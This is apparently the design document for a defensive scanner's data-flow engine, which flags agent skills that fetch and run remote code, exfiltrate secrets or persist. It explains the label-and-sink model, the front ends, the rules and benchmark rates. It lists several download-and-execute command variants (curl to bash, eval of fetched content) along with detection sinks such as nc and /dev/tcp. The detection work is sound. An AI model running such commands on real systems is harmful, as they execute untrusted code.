# The Husk analysis engine

Husk 1.5 added a second detection layer next to its pattern checks. The pattern
checks match what an attack *looks like*. The engine models what code *does*:
where data comes from, what happens to it, and whether those two meet. This
document describes how it works, what it measures, and what it does not do yet.

## Why

In October 2026 a review of Husk's own gate found that a download-and-run payload
only had to avoid one exact shape. `curl https://x | bash` was blocked;
`bash <(curl https://x)`, `sh -c "$(curl https://x)"`, `eval "$(curl https://x)"`,
`bash <<< "$(wget -qO- https://x)"`, `curl -o /tmp/p https://x && sh /tmp/p` and
a dozen more passed. Each could be patched with another regex (1.4.1 did), but
an attacker only needs the shape nobody wrote a pattern for. All of those
commands do the same thing: content fetched from the network ends up as the
input of an interpreter. That is a statement about data flow, so the engine
checks data flow.

## Model

```
            labels                         sinks
  remote   fetched over the network        exec     run as code
  secret   a credential store, or the      inject   spliced into fixed code
           whole environment               send     sent over the network
  decoded  output of a decoder             persist  written to a startup file,
                                                    crontab, launchd, systemd
```

A **value** carries a set of labels and a **trail**: the steps that produced it
(`line 2 fetches https://x/p`, `line 2 saves it to /tmp/p`). When a labelled
value reaches a sink, the front end records a **flow**. **Rules** decide which
flows are findings. Every finding prints its trail, so the reason is never
"matched a pattern" but a chain a reviewer can check line by line:

```
$ husk explain install.sh
  install.sh:3  [HUSK-RCE-001 high] downloaded code is executed
    line 2     fetches https://cdn.fmt-tools.dev/p
    line 2     saves it to /tmp/p
    line 3     runs /tmp/p with sh
```

## Front ends

**Shell** (`engine/shell.py`). A lexer for POSIX/bash syntax (quoting, `$VAR`,
`${VAR}`, `$(...)`, backticks, `<(...)`, here-strings, heredocs, redirections,
line continuations, comments) and an abstract evaluator. The evaluator runs
nothing. It walks the commands in order, keeping variables and the files written
so far, and knows what common commands mean: fetchers (`curl`, `wget`, ...,
including `-o`/`-O`, clustered flags like `-sSLo`, `-d @file` uploads),
interpreters and how they take code (`-c`, stdin, `-s`, a script path, `-`),
`eval`, `source`, decoders (`base64 -d`, `xxd -r`, PowerShell
`-EncodedCommand`), pass-through filters (`tee`, `sed`, `jq`, ...), network
senders (`nc`, `/dev/tcp`), credential reads, `crontab` and startup files.
Wrappers (`sudo -E`, `env`, `nohup`, `timeout`) are seen through. Code that will
run and whose text is known (a decoded payload, a `-c` string, a heredoc) is
analysed recursively, up to three levels deep.

**Python** (`engine/python_frontend.py`). Label propagation over the `ast`:
assignments, attributes, subscripts, f-strings, `with ... as`, `for` loops,
function return values (two passes, so a call above its definition still
counts), `requests.Session()`-style clients, path helpers (`os.path.expanduser`,
`pathlib` `/`), and files written then executed. Sinks: `exec`, `compile`,
`os.system`, `subprocess` with `shell=True` or an interpreter's `-c`, running a
downloaded file, `pickle`/`marshal` loads, `eval` (an injection, not RCE, unless
the input was decoded), `requests.post`/`put`/`patch`, `urlopen` with data,
sockets, `sendmail`.

**JavaScript / TypeScript** (`engine/js_frontend.py`, since 1.6). The same model over
the esprima AST. Modules are resolved through `require`/`import` aliases, destructuring
and `util.promisify`, so `const {exec: run} = require("node:child_process")` is still
`child_process.exec`. Values flow through template literals, `await`, `.then` callbacks,
stream events (`res.on("data", ...)`), function returns and files written to disk.
Sources: `fetch`, axios, got, needle, superagent, ky, request, undici, `http(s).get`;
the whole `process.env` (not `process.env.KEY` or `process.env[name]`); credential
files; `Buffer.from(x, "base64")`, `atob`, `String.fromCharCode`. Sinks: `eval`,
`new Function`, `vm`, `module._compile`, string `setTimeout`, `require()` of a
downloaded file; request bodies, secrets in URLs, `http.request`/socket writes,
`sendBeacon`, `sendMail`, DNS lookups; `fs` writes to startup files.
`child_process` commands are not judged in JavaScript at all: the command line is
rebuilt with each JavaScript value bound to a shell variable and handed to the shell
front end, so ``execSync(`curl ${u} | sh`)`` gets exactly the shell's verdict, and a
fetched value used as a `git` argument is not mistaken for code. TypeScript is
parsed after stripping annotations; syntax newer than esprima 4 (`?.`, `??`, optional
`catch` bindings, top-level `await` next to `import`) is rewritten in place first.

**Documents** (`engine/extract.py`). Skills are mostly Markdown, so the extractor
finds code wherever it is: fenced blocks (`bash`, `console` with prompts
stripped, `python`, `js`/`ts`, `dockerfile`), inline code spans, and prose lines that start
with a command (`Run: curl ... | sh`). Blocks in one document share state, so a
download in one block and its execution three blocks later are connected. It
also reads `package.json` scripts, Dockerfile `RUN` lines and Makefile recipes.

## Rules

Rules are data (`engine/rules/core.yml`), in a strict YAML subset so Husk needs
no YAML dependency:

```yaml
- id: HUSK-RCE-001
  title: downloaded code is executed
  severity: high
  from: [remote]
  to: exec
  trusted_installers: info
  explain: Content fetched from the network runs as code without review ...
```

| Rule | Flow | Severity |
|---|---|---|
| HUSK-EXF-001 | secret -> send | critical |
| HUSK-PER-001 | remote -> persist | critical |
| HUSK-RCE-001 | remote -> exec | high (info from official installer hosts) |
| HUSK-INJ-001 | remote -> inject | medium |
| HUSK-OBF-001 | decoded -> exec | high |
| HUSK-PER-002 | decoded -> persist | high |

`husk rules -v` lists them with explanations. Teams can add their own with
`HUSK_RULES=team.yml` and check a file with `husk rules --check team.yml`.
Errors name the file, line and field. A custom rule cannot reuse a core rule's
id.

The engine's findings go through the same gate as everything else: the
`[RULE severity]` tag in each finding sets its gate severity, and the same
documentation-context logic applies. In Markdown, a command under "never run:"
is an example, not an instruction.

## Measured

1.6 adds the JavaScript front end: +2 malicious skills blocked, +0 benign (see
BENCHMARK.md). The 1.5 numbers below were re-measured with esprima and pypdf
installed and are unchanged.

Benchmarked with `benchmarks/dataset_bench.py`, default gate policy, no LLM.

Engine on its own, six rules:

| Dataset | Engine blocks |
|---|---:|
| MalSkillBench malicious (3,944) | 17.1% |
| SkillTrustBench malicious (2,863) | 22.0% |
| MalSkillBench benign (4,000) | 0.6% |
| SkillTrustBench normal (1,643) | 0.1% |
| Hand-checked legitimate (248) | 0.0% |

What it adds to the full scanner (1.4.1 -> 1.5.0):

| Dataset | Strict, 1.4.1 | Strict, 1.5.0 |
|---|---:|---:|
| MalSkillBench malicious | 45.5% | **48.2%** |
| SkillTrustBench malicious | 50.7% | **59.9%** |
| MalSkillBench benign (false alarms) | 2.8% | 2.8% |
| SkillTrustBench normal (false alarms) | 1.7% | 1.7% |

Choices that were measured, not assumed:

- **A single environment variable is not a secret.** Skills send their API key
  to their own API all the time. Only credential stores and whole-environment
  dumps carry the `secret` label.
- **A skill's own `.env` is not a credential store.** Three benign skills read
  their `.env` to get their key and call their API.
- **Code from GitHub stays high.** Downgrading `raw.githubusercontent.com`
  installers would have cleared 12 benign skills and lost 36 malicious ones.
- **Example domains stay high.** Treating `example.com` fetches as documentation
  cleared no benign skill and lost 75 (synthetic) malicious ones.
- **A decoded payload that looks harmless stays high.** Grading those as medium
  lost 64 malicious skills for 2 benign ones, because the decoded commands were
  reverse shells and deletions that no engine rule covers yet.

## What it does not do yet

- **No flows across files.** A download in `SKILL.md` and its execution in
  `scripts/run.sh` are not connected unless the path names match inside one
  file.
- **No branch reasoning.** Both sides of an `if` count, and a value built from a
  labelled value keeps the label. This over-approximates; precision comes from
  the sinks being narrow (code execution, not "any subprocess").
- **PowerShell, Ruby, Go and Rust** have no engine front end yet.
- **The rule language matches label-to-sink only.** It has no conditions on hosts,
  paths or file types beyond the trusted-installer list.

## Next

1. Retire the pattern checks the engine covers. Measured in 1.6: the pattern
   findings for the same events (curl | bash, decode-and-run, compile-and-run,
   `shell=True`) also catch skills the engine misses, so deleting them would
   lose detections. 1.6 merges them into the engine finding instead when both
   fire on the same line; removing them waits for the engine to cover those
   skills too.
2. Cross-file flows within a package.
3. More sources and sinks: reverse shells, destructive deletes, agent-config
   writes (`~/.claude`, `AGENTS.md`), MCP server definitions.
